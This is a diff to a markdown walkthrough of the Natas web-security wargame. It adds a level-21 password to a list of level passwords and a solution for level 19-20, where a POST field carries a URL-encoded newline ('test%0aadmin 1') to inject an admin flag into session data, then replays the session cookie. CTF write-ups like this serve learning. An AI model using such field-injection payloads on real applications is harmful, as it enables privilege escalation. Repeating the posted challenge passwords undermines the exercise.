@@ -24,6 +24,7 @@ The username is `natas` + the level.
 - 18: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
 - 19: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
 - 20: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
+- 21: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
 
 ## Level 9-10
 
@@ -361,3 +362,25 @@ def solve():
 if __name__ == "__main__":
     solve()
 ```
+
+## Level 19-20
+
+There have to be sent 2 POST requests.
+
+The first one must contain the body:
+
+```txt
+name=test%0aadmin 1
+```
+
+`%0a` is a URL encoded `\n`.
+
+The second one request is basically identical with the addition of the `PHPSESSID` cookie that was returned with the previous request:
+
+```txt
+Cookie: PHPSESSID=qqd4idecf06se380p402pps375
+
+name=test%0aadmin 1
+```
+
+This request will return the response with the password for the next level.
